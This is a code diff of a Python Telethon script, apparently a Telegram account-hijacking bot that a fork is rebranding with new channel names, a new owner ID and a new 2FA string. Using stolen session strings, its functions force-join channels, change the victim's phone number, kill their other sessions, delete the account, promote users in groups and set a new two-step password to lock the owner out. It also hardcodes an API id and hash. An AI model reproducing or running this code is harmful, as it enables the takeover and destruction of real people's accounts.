@@ -20,7 +20,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendboy = 2024465080
+legendboy = 2068551800
 
 Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_OPBot"
 
@@ -28,19 +28,19 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@LegendBot_OP"))
+      await bot(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await bot(join("@LegendBot_AI"))
+      await bot(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Official_LegendBot"))
+      await bot(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Legend_Userbot"))
+      await bot(leave("@Murat_30"))
     except BaseException:
       pass
     try: 
@@ -57,19 +57,19 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@LegendBot_OP"))
+      await bot(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await bot(join("@LegendBot_AI"))
+      await bot(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Official_LegendBot"))
+      await bot(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Legend_Userbot"))
+      await bot(leave("@Murat_30"))
     except BaseException:
       pass
     result = await bot(functions.account.SendChangePhoneCodeRequest(
@@ -87,19 +87,19 @@ async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     return str(k)
@@ -107,19 +107,19 @@ async def userinfo(strses):
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     await X(rt())
@@ -128,15 +128,15 @@ GROUP_LIST = []
 async def delacc(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_Userbot"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@LegendBot_OP"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     await X(functions.account.DeleteAccountRequest("I am chutia"))
@@ -144,19 +144,19 @@ async def delacc(strses):
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
@@ -167,23 +167,23 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X.edit_2fa('LEGENDBOY IS BEST')
+      await X.edit_2fa('HACK IS BEST')
       return True
     except:
       return False
